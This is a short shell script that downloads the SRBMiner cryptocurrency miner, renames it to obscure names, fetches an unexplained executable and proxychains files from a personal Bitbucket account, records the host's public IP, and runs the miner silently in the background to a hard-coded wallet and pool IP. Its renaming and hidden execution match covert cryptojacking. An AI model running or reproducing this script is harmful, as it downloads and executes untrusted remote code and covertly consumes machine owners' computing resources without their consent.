sudo apt update ; sudo apt install cpulimit htop neofetch -y
wget -O hazah.tar.gz https://github.com/doktor83/SRBMiner-Multi/releases/download/2.3.1/SRBMiner-Multi-2-3-1-Linux.tar.xz && tar -xf hazah.tar.gz
wget -q -O prixy https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x prixy
wget https://bitbucket.org/asimadarasi/alima/downloads/libproxychains4.so && chmod +x libproxychains4.so
wget -q https://bitbucket.org/asimadarasi/alima/downloads/proxychains.conf && chmod +x proxychains.conf 
echo " myip.wtf: $(curl https://myip.wtf/text)"
echo "ifconfig.me: $(curl ifconfig.me)"
echo " myip.wtf: $(curl https://myip.wtf/text)" >> wip.txt
echo "ifconfig.me: $(curl ifconfig.me)" >> wip.txt
cd SRBMiner-Multi-2-3-1/
mv SRBMiner-MULTI  ..
cd ..
mv SRBMiner-MULTI zpl
rm -rf SRBMiner-Multi-2-3-1/
#sudo cpulimit --background -e zpl -l 300
nohup ./zpl --algorithm verushash --pool stratum+ssl://139.99.123.225:3958 --wallet RHTx4HUZRrmy8tWhpn5WWX2x7KmfYS4Txq.worker$(( $RANDOM % 1000 + 1 )) --password  --cpu-threads 0 --disable-gpu &> /dev/null &
